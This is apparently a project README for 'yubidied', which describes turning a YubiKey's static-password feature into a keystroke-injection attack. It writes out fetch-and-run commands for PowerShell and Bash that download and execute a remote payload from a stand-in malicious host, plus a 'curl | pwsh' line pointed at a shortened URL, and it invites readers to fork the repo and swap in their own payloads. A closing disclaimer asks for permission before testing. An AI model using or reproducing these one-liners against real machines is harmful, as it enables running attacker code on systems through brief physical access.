# yubidied
malicious and non-malicious payloads for yubikeys!
(a new rubber duckie form)

## Concept
The concept is simple - you set a static password as a command, such as:
```
pwsh -c "iex(iwr malicous.example.com)"                (Windows)
bash <(curl -L malicous.example.com)                   ( Linux )
```
pointing to a payload. It then runs when you open a CMD/SH window, and press the touch sensor.
(note how they both do not use pipe; this is to ensure compatibility with most keyboards)

> [!NOTE]
> Windows' method requires PowerShell to be installed. If you are on a hardened setup without PowerShell (or the pwsh alias), it will not work.

## Excecution
I recommend forking this, and then changing the payloads you need.

This example depicts a demo "calc.exe" open as a demonstration for Windows users.

(``tinyurl.com/payload`` "points" to ``https://raw.githubusercontent.com/SoftPankek/yubidied/refs/heads/main/verylongthingthatwontfitin38chars``)

```bat
curl -L tinyurl.com/payload | pwsh
```

## DISCLAIMER
Do ***NOT*** use this for any malicious purposes, and make sure you have explicit permission before testing.
This *can be a serious security issue* and ***should not be messed around with***.
